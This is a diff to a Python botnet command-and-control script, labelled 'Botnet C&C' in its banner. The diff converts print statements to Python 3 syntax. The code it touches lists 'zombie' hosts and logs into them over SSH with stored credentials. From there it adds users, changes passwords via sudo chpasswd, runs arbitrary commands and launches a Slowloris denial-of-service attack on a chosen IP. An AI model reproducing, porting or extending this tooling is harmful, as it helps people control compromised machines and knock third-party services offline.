@@ -3,13 +3,13 @@ import sys
 
 
 def init_text():
-	print "    ____          __                __     ______ ___     ______\n   / __ ) ____   / /_ ____   ___   / /_   / ____/( _ )   / ____/\n  / __  |/ __ \ / __// __ \ / _ \ / __/  / /    / __ \/|/ /\n / /_/ // /_/ // /_ / / / //  __// /_   / /___ / /_/  </ /__\n/_____/ \____/ \__//_/ /_/ \___/ \__/   \____/ \____/\/\____/\n" 
-	print "1: Zombie list"
-	print "2: Heartbeat"
-	print "3: Add user"
-	print "4: Change user password"
-	print "5: Slowloris DoS attack"
-	print "6: Specific command"
+	print( "    ____          __                __     ______ ___     ______\n   / __ ) ____   / /_ ____   ___   / /_   / ____/( _ )   / ____/\n  / __  |/ __ \ / __// __ \ / _ \ / __/  / /    / __ \/|/ /\n / /_/ // /_/ // /_ / / / //  __// /_   / /___ / /_/  </ /__\n/_____/ \____/ \__//_/ /_/ \___/ \__/   \____/ \____/\/\____/\n" )
+	print( "1: Zombie list")
+	print( "2: Heartbeat")
+	print( "3: Add user")
+	print( "4: Change user password")
+	print( "5: Slowloris DoS attack")
+	print( "6: Specific command")
 	return raw_input("\nOption: ")
 
 
@@ -17,9 +17,9 @@ def list_zombies(users):
 	for u in users:
 		if len(u)>3:
 			try:
-				print "-",u.split("-")[0]
+				print( "-",u.split("-")[0])
 			except:
-				print "Error"
+				print( "Error")
 
 
 def dos_attack(users,attacked_ip):
@@ -43,9 +43,9 @@ def dos_attack(users,attacked_ip):
 					exec_cmd(ip_,uname_,pwd_,cmd_execute_file1,log=False)
 					exec_cmd(ip_,uname_,pwd_,cmd_execute_file2,log=False)
 				except:
-					print "Error contacting IP "+ip_
+					print( "Error contacting IP "+ip_)
 			except:
-				print "Error reading "+u
+				print( "Error reading "+u)
 				pass
 
 
@@ -59,7 +59,7 @@ def heartbeat(users,user_ip):
 				ip_,uname_,pwd_=u.split("-")
 				exec_cmd(ip_,uname_,pwd_,cmd_)
 			except:
-				print "Error"
+				print( "Error"
 	'''
 
 def add_user(users,username):
@@ -75,7 +75,7 @@ def change_pwd(users,username,password):
 				cmd_='echo -e "'+pwd_+'\n'+username+':'+password+'" | sudo -S chpasswd'
 				exec_cmd(ip_,uname_,pwd_,cmd_)
 			except:
-				print "Error"
+				print( "Error")
 
 
 def specific_cmd(users, cmd_):
@@ -85,7 +85,7 @@ def specific_cmd(users, cmd_):
 				ip_,uname_,pwd_=u.split("-")
 				exec_cmd(ip_,uname_,pwd_,cmd_)
 			except:
-				print "Error"
+				print( "Error")
 
 
 def exec_cmd(ip_,uname_,pwd_,cmd_,log=True):
@@ -97,12 +97,12 @@ def exec_cmd(ip_,uname_,pwd_,cmd_,log=True):
 	stdin.write(pwd_+'\n')
 	stdin.flush()
 	if log is True:
-		print "\nOutput from %s: " %(ip_)
+		print( "\nOutput from %s: " %(ip_))
 		for line in stdout:
 			print(line.replace("\n",""))
 		for line in stderr:
 			print(line.replace("\n",""))
-		print "--------------------------------------------"
+		print( "--------------------------------------------" )
 	client.close()
 
 
@@ -127,7 +127,7 @@ def main():
 	elif option == "6":
 		if len(sys.argv) >=2:
 			cmd_=sys.argv[1]
-			print "Command:",cmd_
+			print( "Command:",cmd_)
 		else:
 			cmd_=raw_input("Command: ")
 		specific_cmd(users,cmd_)
